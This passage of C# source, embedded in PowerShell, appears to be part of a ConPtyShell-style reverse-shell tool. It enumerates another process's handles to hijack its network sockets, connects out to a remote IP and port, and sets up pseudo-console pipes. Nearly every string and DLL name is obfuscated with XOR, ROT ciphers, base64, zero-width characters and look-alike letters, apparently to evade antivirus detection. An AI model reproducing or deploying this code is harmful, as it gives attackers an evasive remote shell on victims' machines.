            catch
            {
                break;
            }
            //move pointer to next SYSTEM_HANDLE_TABLE_ENTRY_INFO
            ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO)));
            if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)
                continue;
            if (DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS))
            {
                if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))
                { // this will avoids deadlocks on special named pipe handles
                    // Console.WriteLine("$([char]0x64)$([char]0x65)$([char]0x62)$([char]0x75)$([char]0x67)$([char]0x3A)$([char]0x20)$([char]0x44)$([char]0x65)$([char]0x61)$([char]0x64)$([char]0x6C)$([char]0x6F)$([char]0x63)$([char]0x6B)$([char]0x20)$([char]0x64)$([char]0x65)$([char]0x74)$([char]0x65)$([char]0x63)$([char]0x74)$([char]0x65)$([char]0x64)");
                    CloseHandle(dupHandle);
                    continue;
                }
                ptrObjectName = NtQueryObjectDynamic(dupHandle, OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
                if (ptrObjectName == IntPtr.Zero)
                {
                    CloseHandle(dupHandle);
                    continue;
                }
                try
                {
                    objNameInfo = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(ptrObjectName, typeof(OBJECT_NAME_INFORMATION));
                }
                catch
                {
                    CloseHandle(dupHandle);
                    continue;
                }
                if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0)
                {
                    strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);
                    // Console.WriteLine(('{0}{1}{2}{3}{4}{5}{6}{7}{8}' -f 'deb','u','g: ','file',' h','a','nd','le',' 0x') + dupHandle.ToString($($k9067=104;$b=[byte[]](0x30,0x5c);-join($b|%{[char]($_-bxor$k9067)}))) + $($k3885='6CHTV';$b=[byte[]](0x16,0x30,0x3C,0x26,0x19,0x54,0x29,0x2D,0x37,0x22,0x78,0x22,0x25,0x31,0x76,0x0B,0x63);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3885);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + strObjectName);
                    if (strObjectName == $($k6230='w}wjUo<sOxWIP';$b=[byte[]](0x2B,0x21,0x33,0x0F,0x23,0x06,0x5F,0x16,0x13,0x24,0x16,0x2F,0x34);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6230);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))
                        socketsHandles.Add(dupHandle);
                    else
                        CloseHandle(dupHandle);
                }
                else
                    CloseHandle(dupHandle);
                Marshal.FreeHGlobal(ptrObjectName);
                ptrObjectName = IntPtr.Zero;
            }
        }
        Marshal.FreeHGlobal(ptrHandlesInfo);
        List<IntPtr> dupedSocketsHandles = DuplicateSocketsFromHandles(socketsHandles);
        if (dupedSocketsHandles.Count >= 1)
            dupedSocketsHandles = FilterAndOrderSocketsByBytesIn(dupedSocketsHandles);
        socketsHandles = dupedSocketsHandles;
        return socketsHandles;
    }

    public static bool IsSocketInherited(IntPtr socketHandle, Process parentProcess)
    {
        bool inherited = false;
        List<IntPtr> parentSocketsHandles = GetSocketsTargetProcess(parentProcess);
        if (parentSocketsHandles.Count < 1)
            return inherited;
        foreach (IntPtr parentSocketHandle in parentSocketsHandles)
        {
            SOCKADDR_IN sockaddrTargetProcess = new SOCKADDR_IN();
            SOCKADDR_IN sockaddrParentProcess = new SOCKADDR_IN();
            int sockaddrTargetProcessLen = Marshal.SizeOf(sockaddrTargetProcess);
            int sockaddrParentProcessLen = Marshal.SizeOf(sockaddrParentProcess);
            if (
                (getpeername(socketHandle, ref sockaddrTargetProcess, ref sockaddrTargetProcessLen) == 0) &&
                (getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) == 0) &&
                (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
               )
            {
                // Console.WriteLine((-join('d','ebug',':',' found ','inherite','d s','ocket! h','and','le --> ','0','x')) + parentSocketHandle.ToString($(-join('J4'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}}))));
                inherited = true;
            }
            closesocket(parentSocketHandle);
        }
        return inherited;
    }

    public static bool IsSocketOverlapped(IntPtr socket)
    {
        bool ret = false;
        IntPtr sockEvent = IntPtr.Zero;
        int ntStatus = -1;
        SOCKET_CONTEXT contextData = new SOCKET_CONTEXT();
        ntStatus = NtCreateEvent(ref sockEvent, EVENT_ALL_ACCESS, IntPtr.Zero, SynchronizationEvent, false);
        if (ntStatus != NTSTATUS_SUCCESS)
        {
            // Console.WriteLine(('d'+'eb'+'ug:'+' N'+'tCre'+'at'+'eEven'+'t '+'faile'+'d w'+'ith '+'error'+' code 0x') + ntStatus.ToString($($k9428='%ZTK:S<&';$b=[byte[]](0x7D,0x62);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9428);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))); ;
            return ret;
        }
        IO_STATUS_BLOCK IOSB = new IO_STATUS_BLOCK();
        ntStatus = NtDeviceIoControlFile1(socket, sockEvent, IntPtr.Zero, IntPtr.Zero, ref IOSB, IOCTL_AFD_GET_CONTEXT, IntPtr.Zero, 0, ref contextData, Marshal.SizeOf(contextData));
        // Wait for Completion 
        if (ntStatus == NTSTATUS_PENDING)
        {
            WaitForSingleObject(sockEvent, INFINITE);
            ntStatus = IOSB.status;
        }
        CloseHandle(sockEvent);

        if (ntStatus != NTSTATUS_SUCCESS)
        {
            // Console.WriteLine('d‌e‍b​u‌g‌:‍ ‍N​t‌D‌e‌v​i‍c‍e​I‌o​C‍o‌n‌t‍r‌o​l‍F​i‍l‍e‌ ‌f‌a‍i‌l‌e‍d​ ​w‌i‌t‌h​ ‍e‍r‌r​o​r‌ ​c‍o‍d‍e​ ‍0‌x​' + ntStatus.ToString($($k7741=63;$b=[byte[]](0x67,0x07);-join($b|%{[char]($_-bxor$k7741)})))); ;
            return ret;
        }
        if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != 0) ret = true;
        return ret;
    }

    public static IntPtr DuplicateTargetProcessSocket(Process targetProcess, ref bool overlappedSocket)
    {
        IntPtr targetSocketHandle = IntPtr.Zero;
        List<IntPtr> targetProcessSockets = GetSocketsTargetProcess(targetProcess);
        if (targetProcessSockets.Count < 1) return targetSocketHandle;
        else
        {
            foreach (IntPtr socketHandle in targetProcessSockets)
            {
                // we prioritize the hijacking of Overlapped sockets
                if (!IsSocketOverlapped(socketHandle))
                {
                    // Console.WriteLine($($k6298=193;$b=[byte[]](0xa5,0xa4,0xa3,0xb4,0xa6,0xfb,0xe1,0x87,0xae,0xb4,0xaf,0xa5,0xe1,0xa0,0xe1,0xb4,0xb2,0xa0,0xa3,0xad,0xa4,0xe1,0xb2,0xae,0xa2,0xaa,0xa4,0xb5,0xed,0xe1,0xa3,0xb4,0xb5,0xe1,0xa8,0xb5,0xe1,0xa9,0xa0,0xb2,0xe1,0xaf,0xae,0xb5,0xe1,0xa3,0xa4,0xa4,0xaf,0xe1,0xa2,0xb3,0xa4,0xa0,0xb5,0xa4,0xa5,0xe1,0xb6,0xa8,0xb5,0xa9,0xe1,0xb5,0xa9,0xa4,0xe1,0xa7,0xad,0xa0,0xa6,0xe1,0x96,0x92,0x80,0x9e,0x87,0x8d,0x80,0x86,0x9e,0x8e,0x97,0x84,0x93,0x8d,0x80,0x91,0x91,0x84,0x85,0xed,0xe1,0xb2,0xaa,0xa8,0xb1,0xb1,0xa8,0xaf,0xa6,0xef,0xef,0xef);-join($b|%{[char]($_-bxor$k6298)})));
                    continue;
                }
                targetSocketHandle = socketHandle;
                overlappedSocket = true;
                break;
            }
            // no Overlapped sockets found, expanding the scope by including also Non-Overlapped sockets
            if (targetSocketHandle == IntPtr.Zero) {
                // Console.WriteLine($($k7949='!a>O{';$b=[byte[]](0x45,0x04,0x5C,0x3A,0x1C,0x1B,0x41,0x70,0x20,0x5B,0x4E,0x17,0x5B,0x3D,0x17,0x40,0x11,0x4E,0x2A,0x1F,0x01,0x12,0x51,0x2C,0x10,0x44,0x15,0x4D,0x6F,0x1D,0x4E,0x14,0x50,0x2B,0x55,0x01,0x35,0x4C,0x36,0x12,0x4F,0x06,0x1E,0x3B,0x14,0x01,0x13,0x5B,0x3B,0x0E,0x53,0x0F,0x1E,0x2E,0x17,0x52,0x0E,0x1E,0x21,0x14,0x4F,0x4C,0x51,0x39,0x1E,0x53,0x0D,0x5F,0x3F,0x0B,0x44,0x05,0x1E,0x3C,0x14,0x42,0x0A,0x5B,0x3B,0x08,0x0F,0x4F,0x10);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7949);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})));
                foreach (IntPtr socketHandle in targetProcessSockets)
                {
                    targetSocketHandle = socketHandle;
                    if (!IsSocketOverlapped(targetSocketHandle)) overlappedSocket = false;
                    break;
                }
            }
        }
        if (targetSocketHandle == IntPtr.Zero)
            throw new CPTSHException(([System.Text.Encoding]::UTF8.GetString([byte[]](0x4E,0x6F,0x20,0x73,0x6F,0x63,0x6B,0x65,0x74,0x73,0x20,0x66,0x6F,0x75,0x6E,0x64,0x2C,0x20,0x73,0x6F,0x20,0x6E,0x6F,0x20,0x68,0x69,0x6A,0x61,0x63,0x6B,0x61,0x62,0x6C,0x65,0x20,0x73,0x6F,0x63,0x6B,0x65,0x74,0x73,0x20,0x3A,0x28,0x20,0x45,0x78,0x69,0x74,0x69,0x6E,0x67,0x2E,0x2E,0x2E))));
        return targetSocketHandle;
    }
    public static void SetSocketBlockingMode(IntPtr socket, int mode)
    {
        int FIONBIO = -2147195266;
        int NonBlockingMode = 1;
        int BlockingMode = 0;
        int result;
        if (mode == 1)
            result = ioctlsocket(socket, FIONBIO, ref NonBlockingMode);
        else
            result = ioctlsocket(socket, FIONBIO, ref BlockingMode);
        if (result == -1)
            throw new CPTSHException(('ioctl'+'soc'+'ket fa'+'i'+'led wit'+'h re'+'tur'+'n c'+'od'+'e'+' ') + result.ToString() + ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x61,0x6E,0x64,0x20,0x77,0x73,0x61,0x6C,0x61,0x73,0x74,0x65,0x72,0x72,0x6F,0x72,0x3A,0x20))) + WSAGetLastError().ToString());
    }
}

// source from --> https://stackoverflow.com/a/3346055
[StructLayout(LayoutKind.Sequential)]
public struct ParentProcessUtilities
{
    // These members must match PROCESS_BASIC_INFORMATION
    internal IntPtr Reserved1;
    internal IntPtr PebBaseAddress;
    internal IntPtr Reserved2_0;
    internal IntPtr Reserved2_1;
    internal IntPtr UniqueProcessId;
    internal IntPtr InheritedFromUniqueProcessId;

    [DllImport(('{0}{1}{2}{3}' -f 'ntdll','.','dl','l'))]
    private static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, ref ParentProcessUtilities processInformation, int processInformationLength, out int returnLength);

    public static Process GetParentProcess()
    {
        return GetParentProcess(Process.GetCurrentProcess().Handle);
    }

    public static Process GetParentProcess(int id)
    {
        Process process = Process.GetProcessById(id);
        return GetParentProcess(process.Handle);
    }

    public static Process GetParentProcess(IntPtr handle)
    {
        ParentProcessUtilities pbi = new ParentProcessUtilities();
        int returnLength;
        int status = NtQueryInformationProcess(handle, 0, ref pbi, Marshal.SizeOf(pbi), out returnLength);
        if (status != 0)
            throw new CPTSHException(status.ToString());
        try
        {
            return Process.GetProcessById(pbi.InheritedFromUniqueProcessId.ToInt32());
        }
        catch (ArgumentException)
        {
            // not found
            return null;
        }
    }
}

public static class CPTSH
{
    private const string errorString = '{‌{​{‌C‍o‌n‌P‌t‍y‍S​h‌e​l​l​E‍x‌c‍e‌p‌t‌i​o‌n‍}​}​}‍\‍r‍\‍n‍';
    private const uint ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004;
    private const uint DISABLE_NEWLINE_AUTO_RETURN = 0x0008;
    private const uint PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016;
    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    private const int STARTF_USESTDHANDLES = 0x00000100;
    private const int BUFFER_SIZE_PIPE = 1048576;
    private const int WSA_FLAG_OVERLAPPED = 0x1;
    private const UInt32 INFINITE = 0xFFFFFFFF;
    private const int SW_HIDE = 0;
    private const uint GENERIC_READ = 0x80000000;
    private const uint GENERIC_WRITE = 0x40000000;
    private const uint FILE_SHARE_READ = 0x00000001;
    private const uint FILE_SHARE_WRITE = 0x00000002;
    private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
    private const uint OPEN_EXISTING = 3;
    private const int STD_INPUT_HANDLE = -10;
    private const int STD_OUTPUT_HANDLE = -11;
    private const int STD_ERROR_HANDLE = -12;
    private const int WSAEWOULDBLOCK = 10035;
    private const int FD_READ = (1 << 0);


    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct COORD
    {
        public short X;
        public short Y;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WSAData
    {
        public short wVersion;
        public short wHighVersion;
        public short iMaxSockets;
        public short iMaxUdpDg;
        public IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        public string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        public string szSystemStatus;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [DllImport($($k6481=146;$b=[byte[]](0xf9,0xf7,0xe0,0xfc,0xf7,0xfe,0xa1,0xa0,0xbc,0xf6,0xfe,0xfe);-join($b|%{[char]($_-bxor$k6481)})), SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport(('{0}{1}{2}{3}' -f 'ker','ne','l32.d','ll'), SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport($(-join('smzvmt32.ltt'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}})), SetLastError = true, CharSet = CharSet.Auto, EntryPoint = ('{0}{1}{2}{3}' -f 'Crea','t','ePr','ocess'))]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CreateProcessEx(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport($(-join('rlyuls32.kss'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})), SetLastError = true, CharSet = CharSet.Auto, EntryPoint = 'C‌r‍e‍a​t​e​P‍r​o‌c‍e‌s​s​')]
    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport((-join('ke','rnel3','2.dll')), SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

    [DllImport('kеrnеl32.dll', SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('a2VybmVsMzIuZGxs'))), SetLastError = true)]
    private static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    [DllImport(('ker'+'nel3'+'2.dll'), SetLastError = true)]
    private static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport(('{0}{1}{2}{3}{4}{5}' -f 'kerne','l3','2','.d','l','l'), SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport('kеrnеl32.dll', CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

    [DllImport((-join([char]0x6B, [char]0x65, [char]0x72, [char]0x6E, [char]0x65, [char]0x6C, [char]0x33, [char]0x32, [char]0x2E, [char]0x64, [char]0x6C, [char]0x6C)), CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr SecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport($(-join('oivrip32.hpp'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}})), SetLastError = true)]
    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport('kеrnеl32.dll', SetLastError = true)]
    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

    [DllImport($(-join('lfsofm32.emm'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}})), SetLastError = true)]
    private static extern int CreatePseudoConsole(COORD size, IntPtr hInput, IntPtr hOutput, uint dwFlags, out IntPtr phPC);

    [DllImport('k‌e‍r‍n‍e​l‌3‍2​.​d​l‍l‍', SetLastError = true)]
    private static extern int ClosePseudoConsole(IntPtr hPC);

    [DllImport(('k'+'ernel3'+'2.dl'+'l'), SetLastError = true)]
    private static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint mode);

    [DllImport(('{0}{1}{2}{3}{4}{5}' -f 'ker','ne','l32','.d','l','l'), SetLastError = true)]
    private static extern bool GetConsoleMode(IntPtr handle, out uint mode);

    [DllImport(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('a2VybmVsMzIuZGxs'))))]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool AllocConsole();

    [DllImport("$([char]0x6B)$([char]0x65)$([char]0x72)$([char]0x6E)$([char]0x65)$([char]0x6C)$([char]0x33)$([char]0x32)$([char]0x2E)$([char]0x64)$([char]0x6C)$([char]0x6C)", SetLastError = true, ExactSpelling = true)]
    private static extern bool FreeConsole();

    [DllImport($($k1481='M653K';$b=[byte[]](0x38,0x45,0x50,0x41,0x78,0x7F,0x18,0x51,0x5F,0x27);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1481);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('a2VybmVsMzIuZGxs'))))]
    private static extern IntPtr GetConsoleWindow();

    [DllImport($(-join('dxkgxe32.wee'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}})), CharSet = CharSet.Auto)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(('ke'+'rne'+'l3'+'2'), CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport($(-join('gc2_32.nvv'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}})), CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr WSASocket([In] AddressFamily addressFamily, [In] SocketType socketType, [In] ProtocolType protocolType, [In] IntPtr protocolInfo, [In] uint group, [In] int flags);

    [DllImport($(-join('ie2_32.pxx'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}})), SetLastError = true)]
    private static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);

    [DllImport(([string]::Format('{0}{1}{2}{3}{4}','w','s2_','32.','dl','l')), SetLastError = true)]
    private static extern ushort htons(ushort hostshort);

    [DllImport((-join('ws2_3','2.','dll')), CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern uint inet_addr(string cp);

    [DllImport($($k5908='CT0EC]e(!wbM[-.';$b=[byte[]](0x34,0x27,0x02,0x1A,0x70,0x6F,0x4B,0x4C,0x4D,0x1B);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5908);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})), CharSet = CharSet.Auto)]
    private static extern Int32 WSAGetLastError();

    [DllImport(('{0}{1}{2}' -f 'ws2_3','2.dl','l'), CharSet = CharSet.Auto, SetLastError = true)]
    private static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);

    [DllImport(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d3MyXzMyLmRsbA=='))), CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int closesocket(IntPtr s);

    [DllImport($(-join('so2_32.zhh'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+4)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+4)%26))}else{[char]$c}})), CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int recv(IntPtr Socket, byte[] buf, int len, uint flags);

    [DllImport($(-join('mi2_32.tbb'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}})), CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int send(IntPtr Socket, byte[] buf, int len, uint flags);

    [DllImport("$([char]0x57)$([char]0x53)$([char]0x32)$([char]0x5F)$([char]0x33)$([char]0x32)$([char]0x2E)$([char]0x44)$([char]0x4C)$([char]0x4C)", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr WSACreateEvent();

    [DllImport("$([char]0x57)$([char]0x53)$([char]0x32)$([char]0x5F)$([char]0x33)$([char]0x32)$([char]0x2E)$([char]0x44)$([char]0x4C)$([char]0x4C)", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSAEventSelect(IntPtr s, IntPtr hEventObject, int lNetworkEvents);

    [DllImport($($k9599=49;$b=[byte[]](0x66,0x62,0x03,0x6e,0x02,0x03,0x1f,0x75,0x7d,0x7d);-join($b|%{[char]($_-bxor$k9599)})), CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSAWaitForMultipleEvents(int cEvents, IntPtr[] lphEvents, bool fWaitAll, int dwTimeout, bool fAlertable);

    [DllImport(('WS'+'2'+'_3'+'2.D'+'L'+'L'), CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool WSAResetEvent(IntPtr hEvent);

    [DllImport('W​S‌2​_‌3‌2​.​D‍L‌L‌', CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool WSACloseEvent(IntPtr hEvent);

    [DllImport($(-join('uakss.kss'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})))]
    private static extern uint NtSuspendProcess(IntPtr processHandle);

    [DllImport("$([char]0x6E)$([char]0x74)$([char]0x64)$([char]0x6C)$([char]0x6C)$([char]0x2E)$([char]0x64)$([char]0x6C)$([char]0x6C)")]
    private static extern uint NtResumeProcess(IntPtr processHandle);

    private static void InitWSAThread()
    {
        WSAData data;
        if (WSAStartup(2 << 8 | 2, out data) != 0)
            throw new CPTSHException(String.Format(('WSAStar'+'tup '+'failed'+' '+'w'+'i'+'th '+'error'+' c'+'ode: {0'+'}'), WSAGetLastError()));
    }

    private static IntPtr connectRemote(string remoteIp, int remotePort)
    {
        int port = 0;
        int error = 0;
        string host = remoteIp;

        try
        {
            port = Convert.ToInt32(remotePort);
        }
        catch
        {
            throw new CPTSHException(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3BlY2lmaWVkIHBvcnQgaXMgaW52YWxpZDog'))) + remotePort.ToString());
        }

        IntPtr socket = IntPtr.Zero;
        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, WSA_FLAG_OVERLAPPED);
        SOCKADDR_IN sockinfo = new SOCKADDR_IN();
        sockinfo.sin_family = (short)2;
        sockinfo.sin_addr = inet_addr(host);
        sockinfo.sin_port = (short)htons((ushort)port);

        if (connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0)
        {
            error = WSAGetLastError();
            throw new CPTSHException(String.Format((-join([char]0x57, [char]0x53, [char]0x41, [char]0x43, [char]0x6F, [char]0x6E, [char]0x6E, [char]0x65, [char]0x63, [char]0x74, [char]0x20, [char]0x66, [char]0x61, [char]0x69, [char]0x6C, [char]0x65, [char]0x64, [char]0x20, [char]0x77, [char]0x69, [char]0x74, [char]0x68, [char]0x20, [char]0x65, [char]0x72, [char]0x72, [char]0x6F, [char]0x72, [char]0x20, [char]0x63, [char]0x6F, [char]0x64, [char]0x65, [char]0x3A, [char]0x20, [char]0x7B, [char]0x30, [char]0x7D)), error));
        }

        return socket;
    }

    private static void TryParseRowsColsFromSocket(IntPtr shellSocket, ref uint rows, ref uint cols)
    {
        Thread.Sleep(500);//little tweak for slower connections
        byte[] received = new byte[100];
        int rowsTemp, colsTemp;
        int bytesReceived = recv(shellSocket, received, 100, 0);
        try
        {
            string sizeReceived = Encoding.ASCII.GetString(received, 0, bytesReceived);
            string rowsString = sizeReceived.Split(([System.Text.Encoding]::UTF8.GetString([byte[]](0x20))))[0].Trim();
            string colsString = sizeReceived.Split(' ')[1].Trim();
            if (Int32.TryParse(rowsString, out rowsTemp) && Int32.TryParse(colsString, out colsTemp))
            {
                rows = (uint)rowsTemp;
                cols = (uint)colsTemp;
            }
        }
        catch
        {
            return;
        }
    }

    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite)
    {
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.nLength = Marshal.SizeOf(pSec);
        pSec.bInheritHandle = 1;
        pSec.lpSecurityDescriptor = IntPtr.Zero;
        if (!CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new CPTSHException((-join('Could ','not cr','eate the',' In','pu','tPip','e')));
        if (!CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, BUFFER_SIZE_PIPE))
            throw new CPTSHException((-join([char]0x43, [char]0x6F, [char]0x75, [char]0x6C, [char]0x64, [char]0x20, [char]0x6E, [char]0x6F, [char]0x74, [char]0x20, [char]0x63, [char]0x72, [char]0x65, [char]0x61, [char]0x74, [char]0x65, [char]0x20, [char]0x74, [char]0x68, [char]0x65, [char]0x20, [char]0x4F, [char]0x75, [char]0x74, [char]0x70, [char]0x75, [char]0x74, [char]0x50, [char]0x69, [char]0x70, [char]0x65)));
    }

